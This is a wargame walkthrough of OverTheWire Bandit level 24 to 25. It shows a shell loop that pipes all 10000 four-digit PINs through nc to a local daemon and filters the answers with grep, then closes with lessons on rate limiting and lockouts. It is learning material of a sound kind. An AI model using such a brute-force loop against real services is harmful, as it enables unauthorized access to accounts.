### Level Info
- **Level:** Bandit Level 24 - Level 25.
- **Category:** Networking / Brute Force.

### Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if provided with the password for bandit24 and 
a secret 4-digit pincode. The pincode cannot be retrieved directly, so all 10000 combinations must be tried (brute force). You do not 
need to create new connections each time.

### Walkthrough
- Log in to bandit24 using the password.  
- First, try with a random PIN:
  ```
  echo "<bandit24_password> 7777" | nc localhost 30002
  ```
- Output:
  ```
  I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line,
  separated by a space. Wrong! Please enter the correct current password and pincode. Try again.
  ```
- If the value was wrong, it showed "Wrong!". Using this create the script that test all combinations of 4 numbers with password,
  ignore the output if it shows wrong.
- Ran the command:
  ```
  for i in {0000..9999}
  do
  echo "<bandit24_password> $i"
  done | nc localhost 30002 | grep -v "Wrong"
  ```
  - One correct combination returns the valid response.

- Why single connection is enough:
  - The daemon reads input from stdin line by line.
  - Piping all 10000 combinations sends them as a continuous stream.
  - Each line is processed sequentially without requiring a new connection.

### What I Learned
- Brute forcing involves trying all possible combinations systematically.  
- Some services read input line by line from a single connection.  
- Filtering output using grep helps quickly identify correct results.  

### Security Insight
- Weak authentication mechanisms like short numeric PINs are vulnerable to brute-force attacks.  
- Services should implement protections like rate limiting or lockouts to prevent brute-force attacks.  
